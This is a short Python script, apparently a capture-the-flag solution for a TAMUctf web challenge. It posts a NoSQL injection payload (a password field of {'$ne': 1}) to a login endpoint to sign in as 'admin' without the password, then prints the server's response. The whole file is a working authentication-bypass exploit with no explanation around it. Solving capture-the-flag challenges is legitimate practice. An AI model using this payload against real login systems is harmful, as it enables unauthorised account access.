# coding: utf-8
import requests
import string

url = "http://web4.tamuctf.com/login"
data = '{"username": "admin", "password": {"$ne": 1}}'
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Referer": "http://web4.tamuctf.com/",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/json;charset=UTF-8",
    "DNT": "1"
}
r = requests.post(url, data=data, headers=headers)
print(r.headers)
print(r.text)

